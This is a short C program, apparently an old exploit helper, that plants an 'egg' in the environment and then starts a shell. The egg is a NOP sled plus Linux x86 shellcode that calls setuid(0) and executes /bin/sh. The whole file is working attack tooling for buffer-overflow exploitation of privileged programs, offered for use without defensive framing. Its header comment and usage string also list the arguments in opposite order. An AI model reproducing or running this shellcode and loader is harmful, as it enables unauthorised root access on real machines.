
/*
 *	this shall set egg shell in our environment
 *	./egg <size> <align>
 *	truefinder, seo@igrus.inha.ac.kr
 *
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define DEF_EGGSIZE     4096
#define DEF_ALIGN       5

char nop[] = { 0x90 };



static char shellcode[] =
"\x6a\x17\x58\x31\xdb\xcd\x80\x31"
	"\xd2\x52\x68\x6e\x2f\x73\x68\x68"
	"\x2f\x2f\x62\x69\x89\xe3\x52\x53"
	"\x89\xe1\x8d\x42\x0b\xcd\x80";


 
int
main( int argc, char *argv[] )
{

        char *eggbuf, *buf_ptr;
        int align, i, eggsize ;

        align = DEF_ALIGN;
        eggsize = DEF_EGGSIZE ;

        if ( argc < 2 ) {
                printf ("%s <align> <size>\n", argv[0] );
                exit(0);
        }

        if ( argc > 1 )
                align = DEF_ALIGN + atoi(argv[1]);

        if ( argc > 2 )
                eggsize =  atoi(argv[2]) + DEF_ALIGN ;


        if ( (eggbuf = malloc( eggsize )) == NULL ) {
                printf ("error : malloc \n");
                exit (-1);
        }


        /* set egg buf */
        memset( eggbuf, (int)NULL , eggsize );


        for ( i = 0; i <  250 ; i++ )
                strcat ( eggbuf, nop );

        strcat ( eggbuf, shellcode );

        for ( i =0 ; i < align ; i++ )
                strcat ( eggbuf, "A");

        memcpy ( eggbuf, "S=", 2 );
        putenv ( eggbuf );

        system("/bin/sh");

}

